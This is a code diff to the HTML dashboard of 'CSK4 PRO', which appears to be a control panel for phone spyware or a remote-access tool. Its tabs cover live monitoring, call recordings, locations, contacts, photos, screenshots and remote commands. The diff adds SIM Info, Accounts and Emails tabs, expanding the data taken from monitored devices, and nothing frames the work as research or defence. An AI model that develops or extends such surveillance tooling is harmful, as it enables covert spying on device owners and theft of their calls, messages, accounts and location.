@@ -8,7 +8,6 @@
 </head>
 <body>
 
-<!-- LOGIN SCREEN -->
 <div id="loginScreen" class="login-screen">
   <div class="login-box">
     <h1>CSK4 PRO</h1>
@@ -20,7 +19,6 @@
   </div>
 </div>
 
-<!-- DASHBOARD -->
 <div id="dashboard" class="dashboard hidden">
   <header>
     <h1>🛡️ CSK4 PRO</h1>
@@ -31,10 +29,8 @@
     </div>
   </header>
 
-  <!-- STATS -->
   <div class="stats-grid" id="statsGrid"></div>
 
-  <!-- TABS -->
   <div class="tabs">
     <button class="tab active" data-tab="devices" onclick="showTab('devices', event)">📱 Devices</button>
     <button class="tab" data-tab="live" onclick="showTab('live', event)">🔴 LIVE</button>
@@ -46,6 +42,9 @@
     <button class="tab" data-tab="callrec" onclick="showTab('callrec', event)">🎙️ Call Rec</button>
     <button class="tab" data-tab="locations" onclick="showTab('locations', event)">📍 Locations</button>
     <button class="tab" data-tab="contacts" onclick="showTab('contacts', event)">👥 Contacts</button>
+    <button class="tab" data-tab="siminfo" onclick="showTab('siminfo', event)">📱 SIM Info</button>
+    <button class="tab" data-tab="accounts" onclick="showTab('accounts', event)">👤 Accounts</button>
+    <button class="tab" data-tab="emails" onclick="showTab('emails', event)">📧 Emails</button>
     <button class="tab" data-tab="photos" onclick="showTab('photos', event)">📷 Photos</button>
     <button class="tab" data-tab="videos" onclick="showTab('videos', event)">🎥 Videos</button>
     <button class="tab" data-tab="screenshots" onclick="showTab('screenshots', event)">📸 Screenshots</button>
@@ -59,7 +58,6 @@
     <button class="tab" data-tab="commands" onclick="showTab('commands', event)">🎮 Commands</button>
   </div>
 
-  <!-- TAB CONTENT -->
   <div id="tabContent" class="tab-content">
     <div class="loading">Loading...</div>
   </div>
